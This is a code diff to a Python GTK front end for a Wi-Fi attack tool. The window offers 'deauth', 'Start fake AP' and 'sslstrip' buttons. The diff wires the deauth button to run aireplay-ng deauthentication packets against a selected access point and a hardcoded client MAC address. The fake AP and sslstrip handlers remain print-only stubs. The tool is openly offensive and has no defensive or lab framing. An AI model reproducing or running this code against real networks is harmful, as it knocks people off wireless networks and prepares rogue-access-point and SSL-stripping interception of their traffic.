@@ -79,8 +79,9 @@ class SelectBSSIDWindow(Gtk.Window):
         self.treeview_ap.append_column(self.column_apname)
         
         ## Add selectable
-        self.select_ap = self.treeview_ap.get_selection()
-        self.select_ap.connect("changed", self.on_tree_ap_selection_changed)
+        #self.select_ap = self.treeview_ap.get_selection()
+        #print(self.select_ap)
+        #self.select_ap.connect("changed", self.on_tree_ap_selection_changed)
         
         ## Add scrollable Window to box
         self.box.pack_start(self.scrollable_treeview_ap, True, True, 0)
@@ -114,7 +115,7 @@ class SelectBSSIDWindow(Gtk.Window):
 
         ## Start fake AP
         self.button_fakeAP = Gtk.Button(label="Start fake AP")
-        self.button_fakeAP.connect("clicked", self.on_button_deauth_clicked)
+        self.button_fakeAP.connect("clicked", self.on_fakeAP_clicked)
         self.box.pack_start(self.button_fakeAP, True, True, 0)
 
         ## Start SSlstrip
@@ -140,7 +141,12 @@ class SelectBSSIDWindow(Gtk.Window):
         print("Refresh BSSID/Client Liste")
 
     def on_button_deauth_clicked(self, widget):
-        print ("deauth  des clients en cours")
+        selection = self.treeview_ap.get_selection()
+        model, treeiter = selection.get_selected()
+        print (model[treeiter][0])
+        if treeiter is not None:
+            Popen(['aireplay-ng', '--deauth', '10', '-a', model[treeiter][0], '-c', '70:66:55:78:af:d3', 'wlan0mon', '-D'])
+            print (model[treeiter][0])
 
     def on_fakeAP_clicked(self, widget):
         print ("Fake AP start")
@@ -149,12 +155,10 @@ class SelectBSSIDWindow(Gtk.Window):
         print ("sslstrip start")
 
     ## TREE
-    def on_tree_ap_selection_changed(self, selection):
-        model, treeiter = selection.get_selected()
-        if treeiter is not None:
-            print("You selected MAC ap adress", model[treeiter][0])
-            print("You selected channel", model[treeiter][1])
-            print("You selected AP name", model[treeiter][2])
+    #def on_tree_ap_selection_changed(self, selection):
+    #    model, treeiter = selection.get_selected()
+    #    if treeiter is not None:
+    #        print("You selected MAC ap adress", model[treeiter][0])
 
 
 win = SelectBSSIDWindow()
